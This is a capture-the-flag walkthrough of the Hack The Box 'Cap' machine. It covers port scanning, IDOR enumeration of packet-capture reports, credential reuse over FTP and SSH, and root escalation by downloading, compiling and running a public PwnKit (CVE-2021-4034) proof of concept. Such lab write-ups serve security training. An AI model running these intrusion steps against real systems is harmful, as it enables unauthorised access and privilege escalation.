---
title: Hack the box - Cap
date: 2026-08-13 12:00:00 +00:00
tags: [htb, linux, hack]
description: Hack the box -cap walkthrough
---

# Cap

## Exploring

Since this is an easy machine, start with a quick port scan:

```shell
$ nmap -F 10.129.103.139
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

The web interface is available on port 80. ssh and ftp hidden behind a password.

<img src="/assets/img/hack-the-box-machine-cap/webapp.png">

## User flag

There is nothing particularly interesting in the web interface at first glance, 
except for the ability to capture and download packet dumps. The application 
also exposes reports by numeric IDs.

This suggests a possible IDOR (Insecure Direct Object Reference) vulnerability: 
instead of accessing only the report generated for our own session, we can try 
requesting other report IDs.

```shell
$ for i in {0..101}; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.129.103.139/data/$i");
    
    [[ "$code" == "200" ]] && echo "FOUND: http://10.129.103.139/data $i";
done

FOUND: http://10.129.103.139/data/0
FOUND: http://10.129.103.139/data/1
FOUND: http://10.129.103.139/data/2
```

Several report IDs are accessible without authentication. Downloading and 
inspecting one of the packet captures in Wireshark reveals credentials for 
a local user.

<img src="/assets/img/hack-the-box-machine-cap/wireshark.png">

We can use the discovered credentials to authenticate to the FTP service:

```shell
$ ftp 10.129.103.139
User: nathan
Password: ****
230 Login successful.
ftp> ls
-r--------    1 1001     1001           33 Aug 14 07:36 user.txt
ftp> get user.txt
local: user.txt remote: user.txt
```

## Root flag

After gaining access as nathan, inspect the web application's source code:

```shell
$ ssh -o IdentitiesOnly=yes nathan@10.129.103.139
nathan@cap:~$ ls -l
-r-------- 1 nathan nathan 33 Aug 14 07:36 user.txt
nathan@cap:~$ ls -l /var/www/html/
drwxr-xr-x 2 nathan nathan 4096 May 27  2021 __pycache__
-rw-r--r-- 1 nathan nathan 4293 May 25  2021 app.py
drwxr-xr-x 6 root   root   4096 May 23  2021 static
drwxr-xr-x 2 root   root   4096 May 23  2021 templates
drwxr-xr-x 2 root   root   4096 Aug 14 07:39 upload
nathan@cap:~$ cat /var/www/html/app.py
...
@app.route("/capture")
@limiter.limit("10 per minute")
def capture():
    get_lock()
    pcapid = get_appid()
    increment_appid()
    release_lock()

    path = os.path.join(app.root_path, "upload", str(pcapid) + ".pcap")
    ip = request.remote_addr
    # permissions issues with gunicorn and threads. hacky solution for now.
    #os.setuid(0)
    #command = f"timeout 5 tcpdump -w {path} -i any host {ip}"
    command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
    os.system(command)
    #os.setuid(1000)

    return redirect("/data/" + str(pcapid))
...
```

The application source code does not immediately provide another 
straightforward way to obtain root. At this point, the next step is to 
enumerate the system for possible local privilege-escalation vectors.

Transfer a Linux enumeration script[^1] to the target and execute:

```shell
$ wget https://github.com/diego-treitos/linux-smart-enumeration/releases/download/4.14nw/lse.sh
$ scp -o IdentitiesOnly=yes lse.sh nathan@10.129.103.139:/tmp/
lse.sh                           100%   54KB 200.2KB/s   00:00
$ ssh -o IdentitiesOnly=yes nathan@10.129.103.139
nathan@cap:~$ chmod +x /tmp/lse.sh
nathan@cap:~$ /tmp/lse.sh
If you know the current user password, write it here to check sudo privileges: ****
...
[!] cve-2021-3560 Checking for policykit vulnerability..................... yes!
Vulnerable! polkit version: 0.105-26ubuntu1
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!
Vulnerable! polkit version: 0.105-26ubuntu1
[!] cve-2022-0847 Dirty Pipe vulnerability................................. nope
[!] cve-2022-25636 Netfilter linux kernel vulnerability.................... yes!
5.4.0-80-generic
[!] cve-2023-22809 Sudoedit bypass in Sudo <= 1.9.12p1..................... yes!
Vulnerable! sudo version: 1.8.31-1ubuntu1.2
```

The enumeration reveals several potential privilege-escalation vectors. 
The simplest candidate is `CVE-2021-4034` (PwnKit), a local privilege-escalation 
vulnerability affecting `pkexec`.

Use a proof-of-concept implementation of CVE-2021-4034[^2]. Transfer the PoC 
to the target, compile and execute:

```shell
$ wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c
$ scp -o IdentitiesOnly=yes cve-2021-4034-poc.c nathan@10.129.103.139:/tmp/
cve-2021-4034-poc.c              100% 1267    43.1KB/s   00:00    
$ ssh -o IdentitiesOnly=yes nathan@10.129.103.139
nathan@cap:~$ gcc /tmp/cve-2021-4034-poc.c -o /tmp/exploit
nathan@cap:~$ /tmp/exploit 
# id
uid=0(root) gid=0(root) groups=0(root),1001(nathan)
# ls -l /root
total 8
-r-------- 1 root root   33 Aug 14 07:36 root.txt
```

---

## References

[^1]: [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration/releases/tag/4.14nw)
[^2]: [CVE-2021-4034 POC](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c)
